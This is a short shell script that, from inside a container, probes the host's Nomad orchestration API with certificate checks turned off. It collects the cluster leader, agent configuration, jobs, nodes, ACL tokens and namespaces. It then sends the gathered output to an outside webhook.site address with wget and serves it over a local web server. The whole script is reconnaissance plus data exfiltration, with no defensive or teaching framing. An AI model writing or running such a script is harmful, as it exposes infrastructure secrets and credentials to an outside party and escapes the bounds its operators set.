#!/bin/sh
{
N=https://host.containers.internal:4646
echo "==tls-cert=="; echo | openssl s_client -connect host.containers.internal:4646 -servername nomad 2>/dev/null | openssl x509 -noout -subject -issuer 2>&1 | head -3
echo "==status/leader=="; curl -sk -i -m 5 "$N/v1/status/leader" 2>&1 | head -20
echo; echo "==agent/self=="; curl -sk -m 5 "$N/v1/agent/self" 2>&1 | head -c 1200
echo; echo "==jobs=="; curl -sk -m 5 "$N/v1/jobs" 2>&1 | head -c 1500
echo; echo "==nodes=="; curl -sk -m 5 "$N/v1/nodes" 2>&1 | head -c 1000
echo; echo "==acl-tokens=="; curl -sk -m 5 "$N/v1/acl/tokens" 2>&1 | head -c 300
echo; echo "==namespaces=="; curl -sk -m 5 "$N/v1/namespaces" 2>&1 | head -c 500
} > /www/index.txt 2>&1
wget -q -O- --post-file=/www/index.txt "https://webhook.site/944a0813-f8cb-4afb-92cd-fa404a8621b0/ctr12" >/dev/null 2>&1
httpd -f -p 8080 -h /www
